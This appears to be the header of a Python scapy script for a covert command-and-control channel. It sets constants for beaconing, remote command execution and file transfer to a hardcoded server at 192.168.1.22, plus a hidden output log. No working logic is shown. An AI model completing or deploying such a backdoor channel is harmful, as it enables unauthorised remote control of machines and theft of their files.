import os
from scapy.all import *
import signal
import subprocess
import threading
import base64

 
from scapy.all import *
import threading

FILE = b'filexx'           # module to send file
RUN = b'runxxx'            # module to run command
BEACON = b'beacon'          # client is ready to recieve command
BEGIN_OUTPUT = b'beginou'    # server to open output_file
BEGIN_FILE = b'beginf'       # server to open file - name of the file in the data
IN_TRANSFER = b'transf'      # server to continue writing to the opened file
EF = b'eofeof'              # server to close the opened file

SERVER_ADR = "192.168.1.22"


LOG_OUTPUT = ".log_output.txt"
MTU_SIZE = 1500
HEADER_SIZE = 100

RUN_MODEL = "run"
SEND_MODEL = "send"


    
    
    
